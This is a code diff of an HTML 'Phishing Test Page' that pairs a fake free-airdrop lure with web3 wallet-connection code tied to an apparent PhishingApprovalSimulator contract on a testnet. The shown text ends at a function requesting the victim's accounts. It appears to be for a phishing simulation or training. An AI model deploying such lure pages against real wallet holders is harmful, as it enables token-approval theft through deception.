@@ -4,21 +4,23 @@
     <title>Phishing Test Page</title>
 </head>
 <body>
-    <div>
-        <h2>Claim Your Free Airdrop!</h2>
-        <p>Click the button below to receive your reward.</p>
-        <button onclick="triggerPhishing()">Claim Now</button>
-    </div>
+    <h2>Claim Your Free Airdrop!</h2>
+    <p>Click the button below to receive your reward.</p>
+    <button onclick="triggerPhishing()">Claim Now</button>
 
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script>
         const web3 = new Web3(Web3.givenProvider || "https://data-seed-prebsc-1-s1.binance.org:8545");
 
         // Replace with the contract address from Remix deployment
-        const contractAddress = "0x9aEd13fEB6f70CB35F8ed2383f6CF98EaaeEa2AF";
-        const contractABI = [/* ABI of the PhishingApprovalSimulator contract */];
+        const contractAddress = "0x9aEd13fEB6f70CB35F8ed2383f6CF98EaaeEa2AF"; // Replace with your actual address
+        const contractABI = [ /* ABI of the PhishingApprovalSimulator contract */ ];
 
-        const phishingContract = new web3.eth.Contract(contractABI, contractAddress);
+        let phishingContract;
+
+        window.onload = function () {
+            phishingContract = new web3.eth.Contract(contractABI, contractAddress);
+        }
 
         async function triggerPhishing() {
             const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
